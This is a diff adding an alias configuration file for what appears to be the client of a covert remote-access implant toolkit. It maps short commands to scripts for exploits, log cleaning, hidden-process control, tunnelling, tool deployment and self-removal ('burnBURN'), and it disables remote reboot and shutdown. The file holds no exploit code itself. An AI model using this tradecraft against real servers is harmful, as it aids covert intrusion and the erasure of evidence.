@@ -1,0 +1,153 @@
+
+# Environment variables for the server start with a ':'.  for example:
+#  :PATH=/bin:/usr/bin
+#
+# Aliases that start with '-' use builtin commands.  Aliases that
+#  start with '=' run commands in PATH on he server.  NOTE: this is
+#  just a convention and is not enforced.
+#
+# Last Mod: Thu Aug 30 12:05:54 EDT 2012
+
+
+# this is the working directory on the server
+#WDIR=/tmp/.socket
+
+
+# want color in client?
+COLOR=yes
+
+#Temporary (removed 20 DEC 2011, put back if need be, script still there)
+#alias -ifconfig=-gs ifconfig
+
+# aliases
+
+alias -l=-ls
+alias -lt=-ls -t
+
+alias =survey=-gs survey
+alias =info=-gs info
+alias =mgrep=egrep '(^Subject|^From |^To |name=)'
+alias =mac=
+alias -vget=-get -v
+alias -scans=-gs scans
+alias -sploit=-gs sploit
+alias -jsploit=-gs jsploit
+alias =croncheck=-gs croncheck
+alias =dfcheck=-gs dfcheck
+alias -monitor=-gs monitor
+alias -replay=-gs replay
+alias -orcheck=-gs orcheck
+alias -pccheck=-gs pccheck
+alias -logs=-gs logcheck -L
+alias -logcheck=-gs logcheck
+alias -logclean=-gs grepout
+alias -helpall=-gs helpall
+alias =pscheck=-gs pscheck
+alias =psc=-gs pscolor
+alias =autoget=-gs autoget
+alias -hostinfo=-lsh source /current/tmp/$NOPEN_MYPID.namefix ; 1x -title hostinfo.$NOPEN_RHOSTNAME -geometry 86x68-0-0 -e "less /current/down/hostinfo.$NOPEN_RHOSTNAME"
+alias -dir=-ls
+alias -lss=-gs lss
+alias -lss.py=-gs lss.py
+alias -lssnew=-gs lssnew
+alias -close=-lsh closetunnel
+alias -fwtunnel=-tunnel 1111 udp
+alias -getstrings=-gs getstrings
+alias -vgetstrings=-gs getstrings -p
+alias -gettail=-gs gettail
+alias -gt=-gs gettail
+alias -vgettail=-gs gettail -p
+alias -vgt=-gs gettail -p
+alias =swkill=-gs swkill
+alias =swdump=-gs swkill
+alias =psdiff=-gs psdiff
+alias =stoichidden=-gs stoicctrl -H
+alias =stoicdiff=-gs stoicctrl -H
+alias -os=-gs os
+alias -offset=-gs offset
+alias =mkoffset=-gs mkoffset
+alias -mkoffset=-lsh source /current/tmp/$NOPEN_MYPID.namefix ; [ -e /current/down/mkoffset.$NOPEN_RHOSTNAME ] || echo -e "\\a\\n\\nYou must run =mkoffset once before -mkoffset works.\\n\\n" ; more /current/down/mkoffset.$NOPEN_RHOSTNAME 2>/dev/null
+alias -gets=-gs gets
+alias -holdwindow=-gs holdwin
+alias -hw=-gs holdwin
+alias -hwq=-gs holdwin -q
+alias -hq=-gs holdwin -q
+alias -popup=-gs popup
+alias -pop=-gs popup
+alias -popop=-gs popup
+alias -pitchlog=-gs pitchlog
+alias -histories=-gs histories
+alias =wearcup=-gs wearcup
+alias -addpath=-gs addpath
+alias -tput=-gs tput
+alias -atouch=-gs asciitouch
+#alias -didthis=-gs scriptcheck quiet
+alias -didthis=-gs sessioninit reinit
+alias -autopilot=# DEPRECATED: See gs.tput/autotput as example of new way with autoport
+#alias -prepstun=-gs prepstun
+alias -uz=-gs uz
+alias -mz=-gs mz
+alias -burnBURN=-gs burnBURN
+alias -bb=-gs burnBURN
+alias -bB=-gs burnBURN
+alias -rr=-gs runningrats
+alias -runningrats=-gs runningrats
+alias -crashdump=-gs crashdump
+alias -cc=-gs crashcheck
+alias =install=-gs install
+alias -getnewsuc=-gs getnewsuc
+alias -addalias=-gs addalias
+alias -putfiles=-gs putfiles
+alias -noproxy=-gs noproxy
+alias -mypath=# No host-specific path, use -addpath -A to make one
+alias -mynorc=# No host-specific aliases, use -addalias to make one
+alias -myname=
+alias -myname2=
+alias -lsget=-gs lssnew -G
+
+# Several dangerous remote commands are disabled via aliasing.
+# To use the command (bypass the alias), precede it with \.
+#alias hostname=-lsh echo -e "\\a\\n\\nREMOTE hostname COMMAND IS DISABLED.\\n\\n" ; sleep 2 ;echo -e "\\a\\n\\nREMOTE hostname COMMAND IS DISABLED.\\n\\n"
+alias hostname=-lsh echo -ne "\\aREMOTE hostname COMMAND IS DISABLED." > /current/tmp/.hostname.disabled ; /current/etc/autogetinput -P /current/tmp/.hostname.disabled -O /current/tmp/.hostname.disabled.ans OK
+alias reboot=-lsh echo -ne "\\aREMOTE reboot COMMAND IS DISABLED." > /current/tmp/.reboot.disabled ; /current/etc/autogetinput -P /current/tmp/.reboot.disabled -O /current/tmp/.reboot.disabled.ans OK
+alias halt=-lsh echo -ne "\\aREMOTE halt COMMAND IS DISABLED." > /current/tmp/.halt.disabled ; /current/etc/autogetinput -P /current/tmp/.halt.disabled -O /current/tmp/.halt.disabled.ans OK
+alias shutdown=-lsh echo -ne "\\aREMOTE shutdown COMMAND IS DISABLED." > /current/tmp/.shutdown.disabled ; /current/etc/autogetinput -P /current/tmp/.shutdown.disabled -O /current/tmp/.shutdown.disabled.ans OK
+
+#alias -chili=-lsh echo "Do not run -chili directly, use the -lss -C\\a"
+
+
+alias -ctrl=-gs stoicctrl
+alias -lshidden=-gs stoicctrl -LN
+alias -rsync=-gs rsync
+alias -wh=-gs lss -P
+alias -nsget=-gs lss -GLNOSEND
+alias =deploy=-gs deploy
+alias =nocheck=-gs nocheck
+alias =wrapsift=-gs wrapsift
+alias =call=-gs altcall
+alias -namefix=-lsh /current/etc/nopennamefix
+alias =ercheck=-gs toolcheck
+alias =toolcheck=-gs toolcheck
+alias -bwsofar=-gs bwsofar
+alias =stoiccheck=-gs stoiccheck
+
+alias -problem=-gs problem
+alias -pitch=-gs problem -T PITCHIMPAIR
+alias -noproblem=-gs problem -T NOPEN
+alias -exp=-gs problem -T EXP
+alias -dev=-gs problem -T DEV
+alias -ep=-gs problem -T EP
+alias -pc=-gs problem -T PC
+alias -dsz=-gs problem -T DSZ
+alias -self=-gs problem -T SELF
+alias -note-to-self=-gs problem -T SELF
+alias -note=-gs problem -T SELF
+
+alias -nonopen=-gs problem -N
+alias -newop=-gs problem -O
+alias -newproject=-gs problem -P
+alias -newsched=-gs problem -S
+alias -newschedule=-gs problem -S
+alias -jackpop=-gs jackpop
+
+alias -psg=-gs builtinpsgrep
